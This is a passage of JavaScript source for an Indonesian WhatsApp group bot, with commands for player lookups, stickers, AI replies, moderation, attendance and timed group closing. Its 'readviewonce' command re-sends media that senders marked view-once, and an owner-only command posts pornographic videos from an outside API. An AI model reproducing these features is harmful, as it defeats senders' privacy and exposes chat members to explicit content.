                    const $s = cheerio.load(search.data)
                    const firstPlayer = $s('.box:has(h2:contains("Search results for players")) tbody tr').first()
                    const profilePath = firstPlayer.find('.hauptlink a').attr('href')

                    if (!profilePath) throw "Pemain tidak ditemukan"

                    const profileUrl = "https://www.transfermarkt.com" + profilePath
                    const profile = await axios.get(profileUrl, { headers })
                    const $ = cheerio.load(profile.data)
                    const h = $('.data-header')

                    const res = {
                        name: h.find('h1 strong').text().trim() || h.find('h1').text().trim(),
                        number: h.find('.data-header__shirt-number').text().trim() || '-',
                        club: h.find('.data-header__club a').first().text().trim() || 'No Club',
                        value: h.find('.data-header__market-value-wrapper')
                            .clone().children().remove().end().text().trim() || 'N/A',
                        image:
                            h.find('.data-header__profile-image').attr('src') ||
                            'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png',
                        position: h.find('li:contains("Position") .data-header__content').text().trim() || '-',
                        age: h.find('li:contains("Age") .data-header__content').text().trim() || '-',
                        country: h.find('li:contains("Citizenship") .data-header__content')
                            .text().trim().replace(/\s+/g, ' ') || '-'
                    }

                    let caption = `⚽ *INFORMASI PEMAIN SEPAK BOLA*\n\n`
                    caption += `*Nama pemain:* ${res.name}\n`
                    caption += `*Nomor pemain:* ${res.number}\n`
                    caption += `*Tanggal lahir pemain:* ${res.age}\n`
                    caption += `*Negara pemain:* ${res.country}\n`
                    caption += `*Posisi pemain:* ${res.position}\n`
                    caption += `*Club pemain:* ${res.club}\n`
                    caption += `*Harga pemain:* ${res.value}\n\n`
                    caption += `*Sumber real:* ${profileUrl}`

                    await sock.sendMessage(
                        m.chat,
                        {
                            image: { url: res.image },
                            caption,
                            contextInfo: {
                                externalAdReply: {
                                    title: "BY @VannessWangsaff",
                                    body: "Subscribe YouTube VannessstoreID",
                                    thumbnailUrl: "https://files.catbox.moe/8a47au.jpg",
                                    sourceUrl: profileUrl,
                                    mediaType: 1,
                                    renderLargerThumbnail: false
                                }
                            }
                        },
                        { quoted: m }
                    )

                    await sock.sendMessage(m.chat, {
                        react: { text: "✅", key: m.key }
                    })

                } catch (err) {
                    console.error("TRANSFERMARKT ERROR:", err)
                    m.reply("❌ Gagal mendapatkan data pemain")
                }
            }
                break

            case "swm":
            case "wm": {
                if (!quoted || !/image|video/.test(mime))
                    return m.reply(`Reply gambar / video\nContoh:\n${prefix + command} @VannessWangsaff|By Vanness`)

                let [pack = global.namaBot || "@VannessWangsaff", author = global.namaOwner || ""] =
                    text.split("|").map(v => v.trim())

                try {
                    // download media (sesuai sistem WazOF)
                    const mediaPath = await sock.downloadAndSaveMediaMessage(quoted)

                    const sticker = new Sticker(mediaPath, {
                        pack,
                        author,
                        type: StickerTypes.FULL,
                        quality: 80,
                        background: "#00000000"
                    })

                    const buffer = await sticker.toBuffer()

                    await sock.sendMessage(
                        m.chat,
                        { sticker: buffer },
                        { quoted: m }
                    )

                    if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath)

                } catch (err) {
                    console.error("SWM ERROR:", err)
                    reply("❌ Gagal membuat stiker")
                }
            }
                break

            case "ai":
            case "groq": {
                if (!text)
                    return m.reply(
                        `Contoh:\n${prefix}ai jelaskan black hole\nAtau:\n${prefix}ai buatkan gambar kucing astronot --style ghibli-style`
                    )

                await sock.sendMessage(m.chat, {
                    react: { text: "⏳", key: m.key }
                })

                try {
                    if (isImageRequest(text)) {
                        let style = "flataipro"
                        const styleMatch = text.match(/--style\s+([a-z0-9_-]+)/i)
                        if (styleMatch && STYLES[styleMatch[1]]) style = styleMatch[1]

                        const prompt = text
                            .replace(/--style\s+[a-z0-9_-]+/gi, "")
                            .replace(/buatkan gambar|bikinin gambar|gambar|foto|image/gi, "")
                            .trim()

                        if (!prompt) return reply("Prompt gambar tidak boleh kosong")

                        const images = await flatai(prompt, style)

                        await sock.sendMessage(
                            m.chat,
                            {
                                image: { url: images[0] },
                                caption:
                                    `>Hasil Gambar Anda\n` +
                                    `Prompt: ${prompt}\n` +
                                    `Style: ${style}`
                            },
                            { quoted: m }
                        )

                        await sock.sendMessage(m.chat, {
                            react: { text: "✅", key: m.key }
                        })
                        break
                    }

                    const raw = await groqCompoundQuery(text)
                    const result = normalizeAsterisks(raw)

                    await sock.sendMessage(
                        m.chat,
                        { text: result + "\n\n> Groq AI\n> BY @VannessWangsaff" },
                        { quoted: m }
                    )

                    await sock.sendMessage(m.chat, {
                        react: { text: "✅", key: m.key }
                    })

                } catch (e) {
                    console.error(e)
                    reply("❌ Terjadi kesalahan saat memproses AI")
                }
            }
                break

            case "kick": {
                if (!m.isGroup) return m.reply(mess.group)

                if (!isAdmin)
                    return m.reply(mess.admin)

                if (!isBotAdmin)
                    return m.reply(mess.botAdmin)

                if (!text && !m.quoted)
                    return m.reply("❌ Reply atau masukkan nomor yang ingin di kick")

                let users = m.quoted
                    ? m.quoted.sender
                    : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

                await sock.groupParticipantsUpdate(
                    m.chat,
                    [users],
                    "remove"
                )

                m.reply("Success kick you,jauh² kau bujang🗿")
            }
                break

            case "delete":
            case "del": {
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmin) return m.reply(mess.admin)
                if (!isBotAdmin) return m.reply(mess.botAdmin)

                if (!m.quoted)
                    return reply("Reply pesan yang mau dihapus, lalu ketik *.delete*")

                try {
                    await sock.sendMessage(m.chat, {
                        react: { text: "🧭", key: m.key }
                    })

                    await sock.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.quoted.id,
                            participant: m.quoted.sender
                        }
                    })
                    m.reply("Success delete pesan hama🗿")
                } catch (err) {
                    console.error(err)
                    reply("❌ Gagal menghapus pesan, mungkin pesan terlalu lama atau bukan dari member.")
                }
            }
                break

            case "hidetag":
            case "h": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmin) return reply(mess.admin)
                if (!isBotAdmin) return reply(mess.botAdmin)

                let message =
                    text ||
                    m.quoted?.text ||
                    m.quoted?.caption

                if (!message)
                    return reply("Kirim teks atau reply pesan untuk dihidetag.")

                let member = []

                // fallback kalau participants kosong
                if (!participants || !participants.length) {
                    const meta = await sock.groupMetadata(m.chat)
                    member = meta.participants.map(v => v.id)
                } else {
                    member = participants.map(v => v.id)
                }

                await sock.sendMessage(
                    m.chat,
                    {
                        text: message,
                        mentions: member
                    },
                    { quoted: m }
                )
            }
                break

            case "closegc":
            case "close":
            case "opengc":
            case "open": {
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmin) return reply(mess.botAdmin)
                if (!isAdmin && !isAn) return reply(mess.admin)

                // buka grup
                if (/open|opengc/i.test(command)) {
                    if (groupMetadata.announce === false)
                        return reply("✅ Grup sudah terbuka sebelumnya")

                    await sock.groupSettingUpdate(
                        m.chat,
                        "not_announcement"
                    )
                    reply("🔓 Grup berhasil dibuka,hama dipersilahkan yapping")
                }

                // tutup grup
                else if (/close|closegc/i.test(command)) {
                    if (groupMetadata.announce === true)
                        return reply("🔒 Grup sudah tertutup sebelumnya")

                    await sock.groupSettingUpdate(
                        m.chat,
                        "announcement"
                    )
                    reply("🔒 Grup berhasil ditutup,hama dilarang yapping")
                }
            }
                break

            case "linkgc":
            case "infogc": {
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmin) return reply(mess.botAdmin)
                if (!isAdmin && !isAn) return reply(mess.admin)

                const urlGrup =
                    "https://chat.whatsapp.com/" +
                    await sock.groupInviteCode(m.chat)

                const ownerNumber = groupOwner
                    ? groupOwner.split("@")[0]
                    : "Tidak diketahui"

                const createdAt = groupMetadata?.creation
                    ? new Date(groupMetadata.creation * 1000).toLocaleDateString("id-ID", {
                        day: "2-digit",
                        month: "long",
                        year: "numeric"
                    })
                    : "Tidak diketahui"

                const totalMember = participants.length

                let teks = `*「INFO LENGKAP GROUP INI」*

✧ Nama Group : ${groupName}
✧ Pembuat Group : @${ownerNumber}
✧ Tanggal Dibuat : ${createdAt}
✧ Total Member : ${totalMember}

✧ Link Group :
${urlGrup}

> © @VannessWangsaff`

                await sock.sendMessage(
                    m.chat,
                    {
                        text: teks,
                        mentions: groupOwner ? [groupOwner] : []
                    },
                    { quoted: m }
                )
            }
                break

            case "tagall":
            case "everyone": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmin && !isAn) return reply(mess.owner)

                let me = m.sender
                let teks = (
                    `╚»˙·٠📍 Tag All 📍٠·˙«╝\n` +
                    `😶 *Tagger :* @${m.pushName}\n` +
                    `🌿 *Pesan :* ${q ? q : "no message"}\n\n`
                )

                for (let mem of participants) {
                    if (!mem.id) continue
                    teks += `╰┈➤ @${mem.id.split("@")[0]}\n`
                }

                await sock.sendMessage(
                    m.chat,
                    {
                        text: teks,
                        mentions: participants.map(p => p.id)
                    },
                    { quoted: m }
                )
            }
                break

            case 'readviewonce':
            case 'rvo': {
                if (!m.quoted) return m.reply('Balas atau reply pesan yang ingin di readviewonce');

                try {
                    const q = m.quoted;
                    const msg = q.msg || q;
                    const mime = msg.mimetype || '';
                    const captionAsli =
                        msg.caption ||
                        q.caption ||
                        q.text ||
                        '🔥 Success readviewonce';

                    if (!mime) return m.reply('Jenis media tidak dikenali');

                    let mediaPath;
                    try {
                        mediaPath = await sock.downloadAndSaveMediaMessage(q);
                    } catch (e) {
                        console.error('[RVO ERROR]', e);
                        return m.reply('Gagal mengunduh media');
                    }

                    let sendOpt = {
                        quoted: m,
                        caption: captionAsli
                    };

                    if (/image/.test(mime)) {
                        sendOpt.image = { url: mediaPath };
                    } else if (/video/.test(mime)) {
                        sendOpt.video = { url: mediaPath };
                    } else if (/audio/.test(mime)) {
                        sendOpt.audio = { url: mediaPath };
                        sendOpt.mimetype = mime;
                        sendOpt.ptt = false;
                    } else if (/document/.test(mime)) {
                        sendOpt.document = { url: mediaPath };
                        sendOpt.mimetype = mime;
                        sendOpt.fileName = msg.fileName || 'file';
                    } else if (/sticker/.test(mime)) {
                        sendOpt.sticker = { url: mediaPath };
                    } else {
                        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
                        return m.reply('Jenis media tidak didukung');
                    }

                    await sock.sendMessage(m.chat, sendOpt);

                    if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);

                } catch (err) {
                    console.error('[RVO ERROR]', err);
                    m.reply('Gagal membaca view once');
                }
            }
                break;

            case "hentai": {

                if (!isAn) return reply(mess.owner)

                await sock.sendMessage(m.chat, {
                    react: { text: "🔞", key: m.key }
                });

                try {
                    const res = await axios.get(
                        "https://api.vreden.my.id/api/v1/random/hentai",
                        { timeout: 30000 }
                    );

                    const anu = res.data;
                    if (!anu || !anu.result || anu.result.length < 1) {
                        return m.reply("⚠️ Tidak ada data ditemukan");
                    }

                    // ambil random
                    const rand = anu.result[Math.floor(Math.random() * anu.result.length)];

                    let caption = `*🔞 HENTAI RANDOM*\n\n` +
                        `📌 Judul : ${rand.title || "-"}\n` +
                        `📂 Kategori : ${rand.category || "-"}\n` +
                        `👀 Views : ${rand.views_count || "0"}\n` +
                        `🔗 Link url : ${rand.link || "-"}\n`;

                    if (rand.video_1) {
                        await sock.sendMessage(
                            m.chat,
                            {
                                video: { url: rand.video_1 },
                                caption,
                                mimetype: "video/mp4"
                            },
                            { quoted: m }
                        );
                    } else {
                        await m.reply(caption + `\n⚠️ Video tidak tersedia.`);
                    }

                } catch (err) {
                    console.error("[HENTAI ERROR]", err);
                    m.reply("⚠️ Terjadi kesalahan saat mengambil data");
                }

                await sock.sendMessage(m.chat, {
                    react: { text: "✅", key: m.key }
                });
            }
                break;

            case "sc":
            case "script": {
                // Send reaction
                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });

                const teks = `*╭─━❪ 𝐉𝐀𝐉𝐀𝐍-𝐁𝐎𝐓 𝐕.𝟏 ❫━─*
│
├  *𝖲𝖢𝖱𝖨𝖯𝖳 𝖨𝖭𝖥𝖮*
├  *Name:* JAJAN-BOT V.1
├  *Version:* 1.0
├  *Developer:* @VannessWangsaff
│
├  *𝖣𝖤𝖲𝖢𝖱𝖨𝖯𝖳𝖨𝖮𝖭*
├  Script ini adalah script bot store premium 
├  yang dirancang khusus dengan fitur QRIS Dinamis, 
├  otomatisasi transaksi, manajemen produk,
├  dan layout card interaktif.
│
├  *𝖭𝖮𝖳𝖤*
├  Untuk mendapatkan versi No Encrypt (Full Source), 
├  Silakan hubungi developer resmi dengan menekan 
├  tombol *CONTACT OWNER* di bawah.
│
*╰─━━━━━━━───━─*`;

                const msgii = generateWAMessageFromContent(
                    m.chat,
                    {
                        viewOnceMessage: {
                            message: {
                                interactiveMessage: proto.Message.InteractiveMessage.create({
                                    contextInfo: {
                                        mentionedJid: [m.sender],
                                        externalAdReply: {
                                            title: "JAJAN-BOT V.1 OFFICIAL SCRIPT",
                                            body: "Premium Store Automation Bot",
                                            thumbnailUrl: "https://raw.githubusercontent.com/VANNESS56/DatabaseJajan/main/jajan.jpg",
                                            sourceUrl: "https://vannessstore.id",
                                            mediaType: 1,
                                            renderLargerThumbnail: true,
                                            showAdAttribution: true
                                        }
                                    },
                                    body: proto.Message.InteractiveMessage.Body.create({
                                        text: teks
                                    }),
                                    footer: proto.Message.InteractiveMessage.Body.create({
                                        text: "Powered by @VannessWangsaff"
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                        buttons: [
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "📺 YOUTUBE CHANNEL",
                                                    url: "https://youtube.com/@VannessWangsaff",
                                                    merchant_url: "https://youtube.com"
                                                })
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "📢 WHATSAPP CHANNEL",
                                                    url: "https://whatsapp.com/channel/0029Vak1Mh81noz57tVkqv2y",
                                                    merchant_url: "https://whatsapp.com"
                                                })
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "⸙ CONTACT OWNER",
                                                    url: "https://wa.me/628999991950",
                                                    merchant_url: "https://wa.me"
                                                })
                                            }
                                        ]
                                    })
                                })
                            }
                        }
                    },
                    { userJid: m.sender, quoted: m }
                );

                await sock.relayMessage(
                    msgii.key.remoteJid,
                    msgii.message,
                    { messageId: msgii.key.id }
                );
            }
                break;


            case "mulaiabsen":
            case "startabsen": {
                if (!m.isGroup) return m.reply("Khusus Group");
                if (!isAdmin && !isAn) return m.reply("Khusus Admin");

                global.absen = global.absen ? global.absen : {};

                let id = m.chat;

                if (id in global.absen) {
                    return m.reply(
                        `🚩 _*Masih ada absen di chat ini!*_\n\n` +
                        `*${prefix}hapusabsen* - untuk menghapus absen`
                    );
                }

                global.absen[id] = [];

                await m.reply(
                    `🚩 *Berhasil memulai absen!*\n\n` +
                    `*${prefix}absen* - untuk absen\n` +
                    `*${prefix}cekabsen* - untuk mengecek absen\n` +
                    `*${prefix}hapusabsen* - untuk menghapus data absen`
                );
            }
                break;

            case "absen":
            case "hadir": {
                if (!m.isGroup) return m.reply("Khusus Group");

                global.absen = global.absen ? global.absen : {};
                let id = m.chat;

                if (!(id in global.absen)) {
                    return m.reply(
                        `🚩 _*Tidak ada absen berlangsung di grup ini!*_\n\n` +
                        `*${prefix}mulaiabsen* - untuk memulai absen`
                    );
                }

                let absen = global.absen[id];

                // struktur aman
                if (!Array.isArray(absen[1])) absen[1] = [];
                if (typeof absen[2] !== "string") absen[2] = "-";

                if (absen[1].includes(m.sender)) {
                    return m.reply("🚩 *Kamu sudah absen!*");
                }

                absen[1].push(m.sender);

                let d = new Date();
                let date = d.toLocaleDateString("id-ID", {
                    day: "numeric",
                    month: "long",
                    year: "numeric"
                });

                let list = absen[1]
                    .map((v, i) => `│ ${i + 1}. @${v.split("@")[0]}`)
                    .join("\n");

                await sock.sendMessage(
                    m.chat,
                    {
                        text: `*「 ABSEN 」*

Tanggal: ${date}
${absen[2]}

┌ *List absen:*
│ 
│ Total: ${absen[1].length}
${list}
│ 
└────

_${global.author}_`,
                        mentions: absen[1]
                    },
                    { quoted: m }
                );
            }
                break;

            case "hapusabsen":
            case "delabsen": {
                if (!m.isGroup) return m.reply("Khusus Group");
                if (!isAdmin && !isAn) return m.reply("Khusus Admin");

                global.absen = global.absen ? global.absen : {};
                let id = m.chat;

                if (!(id in global.absen)) {
                    return m.reply(
                        `🚩 _*Tidak ada absen berlangsung di grup ini!*_\n\n` +
                        `*${prefix}mulaiabsen* - untuk memulai absen`
                    );
                }

                delete global.absen[id];

                m.reply("✅ *Absen berhasil dihapus!*");
            }
                break;

            case "cekabsen":
            case "listabsen": {
                if (!m.isGroup) return m.reply("Khusus Group");

                global.absen = global.absen ? global.absen : {};
                let id = m.chat;

                if (!(id in global.absen)) {
                    return m.reply(
                        `🚩 _*Tidak ada absen berlangsung di grup ini!*_\n\n` +
                        `*${prefix}mulaiabsen* - untuk memulai absen`
                    );
                }

                let d = new Date();
                let date = d.toLocaleDateString("id-ID", {
                    day: "numeric",
                    month: "long",
                    year: "numeric"
                });

                let absen = Array.isArray(global.absen[id][1])
                    ? global.absen[id][1]
                    : [];

                let description =
                    typeof global.absen[id][2] === "string"
                        ? global.absen[id][2]
                        : "-";

                let list = absen
                    .map((v, i) => `│ ${i + 1}. @${v.split("@")[0]}`)
                    .join("\n");

                await sock.sendMessage(
                    m.chat,
                    {
                        text: `*「 ABSEN 」*

Tanggal: ${date}
${description}

┌ *List absen:*
│ 
│ Total: ${absen.length}
${list}
│ 
└────

_${global.author}_`,
                        mentions: absen
                    },
                    { quoted: m }
                );
            }
                break;

            case 'intro':
            case 'kartuintro':
            case 'editintro': {
                if (!m.isGroup) return m.reply('Command ini hanya bisa digunakan di grup!');

                const groupName = groupMetadata?.subject || 'Grup Kita';

                // Parsing input sederhana (contoh: .intro nama Vanness usia 25 lokasi Jakarta funfact Suka coding motto Gaspol)
                let nama = m.pushName || 'User';
                let usia = '-';
                let lokasi = '-';
                let funfact = '-';
                let motto = '-';

                if (text) {
                    const args = text.split(/\s+/);
                    let currentField = null;

                    for (let arg of args) {
                        if (arg.toLowerCase() === 'nama') { currentField = 'nama'; continue; }
                        if (arg.toLowerCase() === 'usia') { currentField = 'usia'; continue; }
                        if (arg.toLowerCase() === 'lokasi') { currentField = 'lokasi'; continue; }
                        if (arg.toLowerCase() === 'funfact') { currentField = 'funfact'; continue; }
                        if (arg.toLowerCase() === 'motto') { currentField = 'motto'; continue; }

                        if (currentField) {
                            switch (currentField) {
                                case 'nama': nama = arg; break;
                                case 'usia': usia = arg; break;
                                case 'lokasi': lokasi = arg; break;
                                case 'funfact': funfact = arg; break;
                                case 'motto': motto = arg; break;
                            }
                        }
                    }
                }

                await sock.sendMessage(m.chat, { react: { text: '🪪', key: m.key } });

                const cardBuffer = await generateIntroCard(sock, m.sender, groupName, {
                    nama,
                    usia,
                    lokasi,
                    funfact,
                    motto
                });

                if (!cardBuffer) {
                    return m.reply('Gagal membuat kartu intro. Coba lagi nanti.');
                }

                await sock.sendMessage(m.chat, {
                    image: cardBuffer,
                    caption: `━━━✦ Kartu Intro Kamu ✦━━━\n\n` +
                        `Gunakan format:\n` +
                        `.intro nama [nama] usia [usia] lokasi [lokasi] funfact [fun fact] motto [motto]\n\n` +
                        `Contoh:\n.intro nama Vanness usia 25 lokasi Jakarta funfact Suka coding motto Gaspol aja\n\n` +
                        `Kirim .intro lagi kalau mau edit! 🍃`,
                    mentions: [m.sender]
                }, { quoted: m });

                await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            }
                break;

            case 'closetime': {
                if (!m.isGroup) return reply(mess.group);
                if (!isBotAdmin) return reply(mess.botAdmin);

                if (!text) return reply(`Contoh: ${prefix + command} 10 menit\n\nPilihan: detik, menit, jam, hari`);

                const waktu = parseInt(args[0]);
                const satuan = args[1]?.toLowerCase();

                if (isNaN(waktu) || waktu <= 0) return reply("Masukkan angka waktu yang valid (> 0)");

                let timerMs = 0;
                if (satuan === "detik") timerMs = waktu * 1000;
                else if (satuan === "menit") timerMs = waktu * 60000;
                else if (satuan === "jam") timerMs = waktu * 3600000;
                else if (satuan === "hari") timerMs = waktu * 86400000;
                else return reply("Satuan hanya: *detik*, *menit*, *jam*, *hari*");


                const participants = groupMetadata?.participants || [];
                const mentions = participants.map(p => p.id);

                // Konfirmasi mulai
                await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
                await reply(`*Close time ${waktu} ${satuan}* dimulai sekarang...\nGrup akan ditutup otomatis nanti.`);

                // Pengingat 2 menit sebelum habis (jika timer > 2 menit)
                const reminderMs = 120000; // 2 menit
                if (timerMs > reminderMs) {
                    setTimeout(async () => {
                        try {
                            await sock.sendMessage(m.chat, {
                                text: `⚠️ *Peringatan: 2 menit lagi grup akan ditutup!*\n@everyone Siapkan pesan terakhir kalian ya~`,
                                mentions: mentions
                            });
                            await sock.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } });
                        } catch (err) {
                            console.error("Gagal kirim pengingat close:", err);
                        }
                    }, timerMs - reminderMs);
                }

                // Timer 
                setTimeout(async () => {
                    try {
                        await sock.groupSettingUpdate(m.chat, 'announcement');
                        await sock.sendMessage(m.chat, { react: { text: '🔒', key: m.key } });
                        await reply(`*Tepat waktu!* Grup telah ditutup otomatis.\nSekarang hanya admin yang bisa mengirim pesan,member hama dilarang yapping awokawokawok`);
                    } catch (err) {
                        console.error("Gagal close grup:", err);
                        await reply("Gagal menutup grup. Pastikan bot masih admin.");
                    }
                }, timerMs);

                break;
            }

            case 'opentime': {
                if (!m.isGroup) return reply(mess.group);
                if (!isBotAdmin) return reply(mess.botAdmin);

                if (!text) return reply(`Contoh: ${prefix + command} 5 menit\n\nPilihan: detik, menit, jam, hari`);

                const waktu = parseInt(args[0]);
                const satuan = args[1]?.toLowerCase();

                if (isNaN(waktu) || waktu <= 0) return reply("Masukkan angka waktu yang valid (> 0)");

                let timerMs = 0;
                if (satuan === "detik") timerMs = waktu * 1000;
                else if (satuan === "menit") timerMs = waktu * 60000;
                else if (satuan === "jam") timerMs = waktu * 3600000;
                else if (satuan === "hari") timerMs = waktu * 86400000;
                else return reply("Satuan hanya: *detik*, *menit*, *jam*, *hari*");

                // Ambil semua member untuk mention @everyone
                const participants = groupMetadata?.participants || [];
                const mentions = participants.map(p => p.id);

                // Konfirmasi mulai
                await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
                await reply(`*Open time ${waktu} ${satuan}* dimulai sekarang...\nGrup akan dibuka otomatis nanti.`);

                // Pengingat 2 menit sebelum habis
                const reminderMs = 120000;
                if (timerMs > reminderMs) {
                    setTimeout(async () => {
                        try {
                            await sock.sendMessage(m.chat, {
                                text: `⚠️ *Peringatan: 2 menit lagi grup akan dibuka kembali!*\n@everyone Siap-siap yapping lagi ya~`,
                                mentions: mentions
                            });
                            await sock.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } });
                        } catch (err) {
                            console.error("Gagal kirim pengingat open:", err);
                        }
                    }, timerMs - reminderMs);
                }

                // Timer utama: buka grup
                setTimeout(async () => {
                    try {
                        await sock.groupSettingUpdate(m.chat, 'not_announcement');
                        await sock.sendMessage(m.chat, { react: { text: '🔓', key: m.key } });
                        await reply(`*Tepat waktu!* Grup telah dibuka kembali.\nSemua member hama sekarang bisa yapping awokawokawok.`);
                    } catch (err) {
                        console.error("Gagal open grup:", err);
                        await reply("Gagal membuka grup. Pastikan bot masih admin.");
                    }
                }, timerMs);

                break;
            }

            case 'onsholat':
            case 'offsholat': {
                if (!isAn) return reply(mess.owner);

                const config = (() => {
                    try {
                        return JSON.parse(fsSync.readFileSync(onsholatFile, 'utf8'));
                    } catch {
                        const def = { aktif: false, grups: [], durasiTutup: 10 };
                        fsSync.writeFileSync(onsholatFile, JSON.stringify(def, null, 2));
                        return def;
                    }
                })();

                const sub = args[0]?.toLowerCase() || '';

                // Aktifkan global
                if (command === 'onsholat' && !sub) {
                    if (config.aktif) return reply("Fitur onsholat global **sudah aktif**.");

                    config.aktif = true;
                    fsSync.writeFileSync(onsholatFile, JSON.stringify(config, null, 2));

                    await reply(
                        `✅ *Fitur onsholat GLOBAL telah diaktifkan!*\n\n` +
                        `Semua grup terdaftar akan otomatis:\n` +
                        `• Ditutup tepat waktu sholat\n` +
                        `• Dibuka kembali setelah ${config.durasiTutup} menit\n\n` +
                        `Gunakan .onsholat add / del / list untuk mengatur grup.\n` +
                        `Jadwal hari ini (Riau & sekitarnya):`
                    );

                    // Jalankan jadwal sekarang
                    scheduleOnSholatGlobal();
                    break;
                }

                // Matikan global
                if (command === 'offsholat' || (command === 'onsholat' && sub === 'off')) {
                    if (!config.aktif) return reply("Fitur onsholat global **sudah nonaktif**.");

                    config.aktif = false;
                    fsSync.writeFileSync(onsholatFile, JSON.stringify(config, null, 2));

                    reply("⛔ Fitur onsholat global telah **dinonaktifkan**.\nJadwal close/open otomatis berhenti.");
                    break;
                }

                // Sub-command pengaturan grup
                if (sub === 'add' || sub === 'tambah') {
                    if (!m.isGroup) return reply("Hanya bisa di grup!");
                    if (!isAdmin && !isAn) return reply(mess.admin);

                    if (config.grups.includes(m.chat)) {
                        return reply("Grup ini sudah terdaftar di onsholat global.");
                    }

                    config.grups.push(m.chat);
                    fsSync.writeFileSync(onsholatFile, JSON.stringify(config, null, 2));

                    reply(`✅ Grup ini ditambahkan ke daftar onsholat global.\nTotal grup: ${config.grups.length}`);
                    break;
                }

                if (sub === 'del' || sub === 'hapus') {
                    if (!m.isGroup) return reply("Hanya bisa di grup!");
                    if (!isAdmin && !isAn) return reply(mess.admin);

                    config.grups = config.grups.filter(id => id !== m.chat);
                    fsSync.writeFileSync(onsholatFile, JSON.stringify(config, null, 2));

                    reply(`🗑️ Grup ini dihapus dari daftar onsholat global.\nSisa: ${config.grups.length}`);
                    break;
                }

                if (sub === 'list') {
                    if (config.grups.length === 0) return reply("Belum ada grup terdaftar di onsholat global.");

                    let teks = `📋 *DAFTAR GRUP ONSHOLAT GLOBAL*\nTotal: ${config.grups.length}\n\n`;
                    for (let i = 0; i < config.grups.length; i++) {
                        try {
                            const meta = await sock.groupMetadata(config.grups[i]);
                            teks += `${i + 1}. ${meta.subject || 'Grup tidak ditemukan'}\n   ${config.grups[i]}\n`;
                        } catch {
                            teks += `${i + 1}. ${config.grups[i]} (mungkin sudah dihapus)\n`;
                        }
                    }
                    reply(teks);
                    break;
                }

                // Help / status jika tidak ada sub-command
                reply(
                    `*Fitur OnSholat Global*\n\n` +
                    `Status saat ini: ${config.aktif ? 'AKTIF ✅' : 'NONAKTIF ❌'}\n` +
                    `Jumlah grup terdaftar: ${config.grups.length}\n` +
                    `Durasi tutup: ${config.durasiTutup} menit\n\n` +
                    `Perintah:\n` +
                    `• .onsholat          → aktifkan fitur global\n` +
                    `• .offsholat         → matikan fitur global\n` +
                    `• .onsholat add      → tambah grup ini\n` +
                    `• .onsholat del      → hapus grup ini\n` +
                    `• .onsholat list     → lihat daftar grup`
                );
                break;
            }












            // Case autosholat (handler perintah, seperti sebelumnya)
            case 'autosholat': {
                if (!m.isGroup) return reply("Perintah ini hanya untuk grup!");

                const autosholatFile = './lib/autosholat.json';

                if (!fsSync.existsSync(autosholatFile)) {
                    fsSync.writeFileSync(autosholatFile, JSON.stringify({
                        aktif: false,
                        grups: [],
                        hidetag: false,
                        close: false
                    }, null, 2));
                }

                let config = JSON.parse(fsSync.readFileSync(autosholatFile));
                const grupId = m.chat;

                const sub = args[0] ? args[0].toLowerCase() : '';

                switch (sub) {
                    case 'add':
                        if (!isAdmin && !isAn) return reply(mess.admin);
                        if (config.grups.includes(grupId)) return reply("Grup sudah terdaftar.");
                        config.grups.push(grupId);
                        fsSync.writeFileSync(autosholatFile, JSON.stringify(config, null, 2));
                        reply(`✅ Grup ditambahkan ke autosholat.\nTotal: ${config.grups.length}`);
                        break;

                    case 'del':
                    case 'hapus':
                        if (!isAdmin && !isAn) return reply(mess.admin);
                        config.grups = config.grups.filter(id => id !== grupId);
                        fsSync.writeFileSync(autosholatFile, JSON.stringify(config, null, 2));
                        reply(`🗑️ Grup dihapus dari autosholat.\nSisa: ${config.grups.length}`);
                        break;

                    case 'list':
                        if (config.grups.length === 0) return reply("Belum ada grup terdaftar.");
                        let txt = `📋 *DAFTAR AUTOSHOLAT*\nTotal: ${config.grups.length}\n\n`;
                        for (let i = 0; i < config.grups.length; i++) {
                            try {
                                const meta = await sock.groupMetadata(config.grups[i]);
                                txt += `${i + 1}. ${meta.subject || 'Grup tidak ditemukan'}\n   ${config.grups[i]}\n`;
                            } catch {
                                txt += `${i + 1}. ${config.grups[i]} (mungkin sudah dihapus)\n`;
                            }
                        }
                        reply(txt);
                        break;

                    case 'on':
                        if (!isAn) return reply(mess.owner);
                        config.aktif = true;
                        fsSync.writeFileSync(autosholatFile, JSON.stringify(config, null, 2));
                        reply("✅ Autosholat diaktifkan (global, setiap hari). Pengingat akan berjalan.");
                        break;

                    case 'off':
                        if (!isAn) return reply(mess.owner);
                        config.aktif = false;
                        fsSync.writeFileSync(autosholatFile, JSON.stringify(config, null, 2));
                        reply("⛔ Autosholat dimatikan (global).");
                        break;

                    case 'hidetag':
                        if (!isAn) return reply(mess.owner);
                        const ht = args[1]?.toLowerCase();
                        if (!['on', 'off'].includes(ht)) return reply("Gunakan: .autosholat hidetag on/off");
                        config.hidetag = ht === 'on';
                        fsSync.writeFileSync(autosholatFile, JSON.stringify(config, null, 2));
                        reply(`Hidetag diubah: *${ht.toUpperCase()}*`);
                        break;

                    case 'close':
                        if (!isAn) return reply(mess.owner);
                        const cl = args[1]?.toLowerCase();
                        if (!['on', 'off'].includes(cl)) return reply("Gunakan: .autosholat close on/off");
